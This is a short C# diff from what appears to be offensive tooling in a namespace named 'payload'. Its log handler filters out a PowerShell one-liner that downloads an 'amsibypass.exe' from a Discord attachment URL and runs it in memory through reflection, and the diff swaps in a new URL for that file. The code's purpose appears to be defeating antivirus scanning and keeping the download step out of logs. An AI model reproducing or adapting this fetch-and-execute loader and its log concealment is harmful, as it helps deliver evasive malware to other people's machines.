@@ -79,7 +79,7 @@ namespace payload
 
         private void OutputHandler(object sender, DataReceivedEventArgs e)
         {
-            if (e.Data.Contains("$wc = New-Object System.Net.WebClient;$asmdata = $wc.DownloadData('https://cdn.discordapp.com/attachments/961905736139554876/969797235741175838/amsibypass.exe');$wc.Dispose();[System.Reflection.Assembly]::Load($asmdata).EntryPoint.Invoke($null, $null)")) return; 
+            if (e.Data.Contains("https://cdn.discordapp.com/attachments/961905736139554876/972864676042006598/amsibypass.exe")) return; 
             log.Add(e.Data);
         }
     }
